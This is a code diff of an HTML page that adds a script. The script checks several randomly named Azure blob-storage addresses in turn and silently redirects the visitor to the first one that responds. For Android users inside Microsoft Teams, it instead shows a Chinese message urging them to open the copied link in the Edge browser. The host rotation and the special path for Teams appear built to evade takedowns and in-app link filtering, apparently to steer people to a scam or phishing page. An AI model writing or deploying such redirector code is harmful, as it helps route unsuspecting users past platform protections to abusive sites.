@@ -65,16 +65,18 @@
     font-size: 20px;
     margin: 16px 0 8px;
   }
-  #alt .copy-box {
-    display: inline-block;
+  #alt p {
+    margin: 0;
+    font-size: 14px;
+  }
+  #copy-box {
     margin-top: 12px;
-    padding: 10px 16px;
-    background: #f0f4ff;
-    color: #333;
+    padding: 10px;
+    background: #e3e8f0;
     border-radius: 6px;
+    word-break: break-all;
     font-size: 14px;
     cursor: pointer;
-    border: 1px solid #4f71ff;
     user-select: all;
   }
 </style>
@@ -89,4 +91,73 @@
 </div>
 
 <div id="alt">
-  <
+  <h1>您的手机暂时不支持</h1>
+  <p>请到应用商店下载 <strong>EDGE 浏览器</strong> 访问</p>
+  <div id="copy-box" onclick="copyUrl()">正在检测可用地址…</div>
+</div>
+
+<script>
+(async function () {
+  const urls = [
+    "https://iwtq25dhr.blob.core.windows.net/home/index.html",
+    "https://fx4iug5qsp.blob.core.windows.net/home/index.html",
+    "https://hjdkc8731miw.blob.core.windows.net/home/index.html",
+    "https://x93yv2cak5w8.z48.web.core.windows.net/home/index.html"
+  ];
+  const isAndroid = /android/i.test(navigator.userAgent);
+  const isTeams = /Teams/i.test(navigator.userAgent);
+
+  if (isAndroid && isTeams) {
+    for (const u of urls) {
+      try {
+        await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
+        showAlt(u);
+        return;
+      } catch (e) {
+        // try next
+      }
+    }
+    showError();
+    return;
+  }
+
+  for (const u of urls) {
+    try {
+      await fetch(u, { method: "HEAD", mode: "no-cors", cache: "no-store" });
+      location.replace(u);
+      return;
+    } catch (e) {
+      // try next
+    }
+  }
+
+  showError();
+})();
+
+function showError() {
+  document.getElementById("bar").style.display = "none";
+  document.getElementById("err").style.display = "block";
+}
+
+function showAlt(url) {
+  document.getElementById("bar").style.display = "none";
+  document.getElementById("alt").style.display = "block";
+  const box = document.getElementById("copy-box");
+  box.textContent = url;
+  box.dataset.url = url;
+}
+
+function copyUrl() {
+  const url = document.getElementById("copy-box").dataset.url;
+  if (!url) return;
+  navigator.clipboard.writeText(url).then(() => {
+    alert("已复制网址");
+  });
+}
+
+function retry() {
+  location.reload();
+}
+</script>
+</body>
+</html>
